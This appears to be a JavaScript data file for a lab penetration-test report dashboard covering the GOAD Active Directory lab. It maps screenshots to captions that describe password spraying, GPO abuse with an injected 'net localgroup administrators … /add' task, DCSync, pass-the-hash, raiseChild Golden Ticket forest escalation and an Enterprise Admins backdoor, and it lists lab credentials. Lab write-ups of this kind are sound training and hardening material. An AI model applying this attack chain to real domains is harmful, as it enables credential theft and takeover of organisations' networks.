      { src: EVIDENCE_IMG + "pth_wf_cb.png", caption: "Pass-the-Hash: eddard.stark & goadmin auf Winterfell + Castelblack — (Pwn3d!) mit DA-Hashes (Trust/Lateral)." },
      { src: EVIDENCE_IMG + "grafik.png", caption: "Lab-Dead-End: getST.py mit Child-TGT (-k) gegen cifs/kingslanding.sevenkingdoms.local → Kerberos SessionError KDC_ERR_WRONG_REALM. Cross-realm braucht korrekten KDC/Realm — praktisch blieben NTLM/PTH über Trust und raiseChild." }
    ],
    11: [
      { src: EVIDENCE_IMG + "north_compromised_dump.png", caption: "Cross-Domain-Auth (eddard.stark-Hash) gegen Kingslanding + secretsdump -just-dc: vollständiger Child-NTDS-Dump via DRSUAPI (raiseChild-Vorbereitung)." }
    ],
    12: [
      { src: EVIDENCE_IMG + "dcsync_ntds.png", caption: "Lab-Session: DRSUAPI-Extraktion gegen Root-DC (gleiches Tooling wie Forest-DCSync)." }
    ],
    15: [
      { src: EVIDENCE_IMG + "image.png", caption: "ldapsearch auf Enterprise Admins: member: CN=KINGHODOR,CN=Users,DC=sevenkingdoms,DC=local — Persistenz-Backdoor in EA bestätigt (ubuntu-jumpbox)." }
    ]
  },
  hosts: {
    jumpbox: [
      { src: EVIDENCE_IMG + "linux_windows_ops.png", caption: "Operator-Kontext: Linux-Tools auf dem Jumpbox ↔ Windows-Zielartefakte (CME, secretsdump, schtasks-Äquivalent)." },
      { src: EVIDENCE_IMG + "grafik.png", caption: "Kerberos-Experiment vom Jumpbox: getST.py / falscher Realm beim Root-SPN — siehe auch Schritt 10." }
    ],
    castelblack: [
      { src: EVIDENCE_IMG + "cme_castelblack.png", caption: "Erfolgreiche Admin-Auth jeor.mormont → Castelblack." },
      { src: EVIDENCE_IMG + "jeor_whoami.png", caption: "Ausgeführter Befehl auf dem Host (Gruppenmitgliedschaft)." },
      { src: EVIDENCE_IMG + "lsa_secretsdump.png", caption: "Registry/LSA-Dump von diesem Server." }
    ],
    winterfell: [
      { src: EVIDENCE_IMG + "gpo_winterfell_pwn3d.png", caption: "Nach GPO-Task: samwell.tarly local admin auf dem DC." },
      { src: EVIDENCE_IMG + "bh_shortest_path.png", caption: "BloodHound-Pfade über Winterfell / GPO / DC.", bhTopology: true },
      { src: EVIDENCE_IMG + "image(1).png", caption: "Child-DA goadmin (Pwn3d!) auf Winterfell — Hash-basierte Admin-Session nach DCSync." }
    ],
    kingslanding: [
      { src: EVIDENCE_IMG + "dcsync_ntds.png", caption: "DRSUAPI gegen Kingslanding (Forest-Hash-Extraktion in der Lab-Session)." },
      { src: EVIDENCE_IMG + "pth_wf_cb.png", caption: "Cross-Trust-PTH-Tests (goadmin/eddard) — relevant für Root-Logons." }
    ]
  },
  domains: {
    north: [
      { src: EVIDENCE_IMG + "domain_admins.png", caption: "Mitglieder Domain Admins@north.sevenkingdoms.local (GOADMIN markiert kompromittiert).", bhTopology: true },
      { src: EVIDENCE_IMG + "bh_shortest_path.png", caption: "Angriffsgraph: mehrere Kanten zu Domain Admins (GPO, Delegation, ACLs).", bhTopology: true }
    ],
    root: [
      { src: EVIDENCE_IMG + "dcsync_ntds.png", caption: "Terminal: NTDS-Replikation / Hash-Liste nach Forest-Eskalation." },
      { src: EVIDENCE_IMG + "image.png", caption: "LDAP: KINGHODOR als member unter Enterprise Admins@sevenkingdoms.local." }
    ]
  },
  topology: {
    baseline: [
      { src: EVIDENCE_IMG + "goad_lab_topology.png", caption: "Official GOAD lab topology (ForestLord-ZeroTrustOrNot-GOAD): sevenkingdoms.local ↔ north.sevenkingdoms.local with DC01 (.10), DC02 (.11), SRV02 (.22) and bidirectional trust — validated against the dashboard attack-surface map above." }
    ]
  },
  hardening: {
    laps: [
      { src: EVIDENCE_IMG + "cme_castelblack.png", caption: "Shared local admin ohne LAPS: ein Passwort → (Pwn3d!) auf Castelblack." },
      { src: EVIDENCE_IMG + "jeor_whoami.png", caption: "Nachweis Administrator-Gruppe auf dem Member Server." }
    ],
    mssql: [
      { src: EVIDENCE_IMG + "lsa_secretsdump.png", caption: "Service-Passwort sql_svc im Klartext in LSA — direkter Treiber für xp_cmdshell-Härtung." }
    ],
    gpo: [
      { src: EVIDENCE_IMG + "gpo_winterfell_pwn3d.png", caption: "GPO-Scheduled-Task → sofort (Pwn3d!) auf dem DC — SIEM-blinder Spot." }
    ],
    dcsync: [
      { src: EVIDENCE_IMG + "dcsync_ntds.png", caption: "DRSUAPI-Dump: das, was 4662 hätte sichtbar machen müssen." },
      { src: EVIDENCE_IMG + "domain_admins.png", caption: "Auswirkung: volle DA-Mitgliedschaft im Graph.", bhTopology: true }
    ],
    sidfilter: [
      { src: EVIDENCE_IMG + "pth_wf_cb.png", caption: "Child-DA-Hashes authentifizieren lateral über WF/CB — Trust ohne SID-Filter." },
      { src: EVIDENCE_IMG + "grafik.png", caption: "Kerberos cross-realm ist fehleranfällig (KDC_ERR_WRONG_REALM) — Trust-Abuse in der Praxis oft NTLM/ExtraSid (raiseChild), nicht einfaches getST." }
    ],
    persist: [
      { src: EVIDENCE_IMG + "image.png", caption: "Nachweis: KINGHODOR in Enterprise Admins per ldapsearch — Gruppen-Adds (4728/4756) fehlen im SIEM, LDAP-Check schließt die Lücke manuell." }
    ]
  }
};

/* Annotated field-note pages (GIMP) — the operator's hand-marked write-up, one
   per intrusion phase. These are full-resolution reference captures. */
const WRITEUP_DIR = "assets/reportaspng/upscayl_png_ultrasharp-4x_2x/";
const WRITEUP_PAGES = [
  {
    n: 1, phase: "foothold", steps: [1, 2, 3],
    title: "Reconnaissance, Initial Access & AD Enumeration",
    file: "Screenshot 2026-06-12 144712_upscayl_2x_ultrasharp-4x.png",
    caption: "Field notes — Nmap + CrackMapExec SMB fingerprinting, an NCSC top-100k password spray that recovered brandon.stark : iseedeadpeople, and authenticated LDAP enumeration of Winterfell exposing samwell.tarly's cleartext password (Heartsbane) in the description attribute."
  },
  {
    n: 2, phase: "child", steps: [7, 8],
    title: "BloodHound Mapping & GPO Privilege Escalation",
    file: "Screenshot 2026-06-12 144833.png",
    caption: "Field notes — bloodhound-python collection as brandon.stark (JSON pulled directly rather than via the GUI) revealed samwell.tarly's Write over GPO STARKWALLPAPER; pyGPOAbuse then injected an Immediate Scheduled Task (net localgroup administrators samwell.tarly /add), executed by the DC's client-side extensions → local admin (Pwn3d!) on Winterfell."
  },
  {
    n: 3, phase: "child", steps: [9],
    title: "Child Domain Compromise (DCSync)",
    file: "Screenshot 2026-06-12 144844_upscayl_2x_ultrasharp-4x.png",
    caption: "Field notes — local admin on a DC grants DCSync. Impacket secretsdump.py -just-dc impersonated a domain controller over DRSUAPI and replicated the child goadmin NTLM hash plus the krbtgt master key (and all child user/AES material)."
  },
  {
    n: 4, phase: "forest", steps: [10, 11],
    title: "Forest Escalation via Trust Abuse",
    file: "Screenshot 2026-06-12 144909_upscayl_2x_ultrasharp-4x.png",
    caption: "Field notes — Impacket raiseChild.py forged a Golden Ticket with the child krbtgt and injected the Enterprise Admins SID (ending …-519) into SIDHistory. The root DC honoured it (SID filtering disabled), enabling a full root DCSync and forest takeover."
  },
  {
    n: 5, phase: "persist", steps: [12, 13, 14, 15, 16],
    title: "Post-Exploitation: Infrastructure Provisioning Artifacts",
    file: "Screenshot 2026-06-12 144925_upscayl_2x_ultrasharp-4x.png",
    caption: "Field notes — the D$ admin share exposed VMAgentLogs.zip containing the goadmin cleartext password from the Infrastructure-as-Code deployment, with the final wmiexec / CrackMapExec (Pwn3d!) proof against Kingslanding confirming full parent-domain control."
  }
];
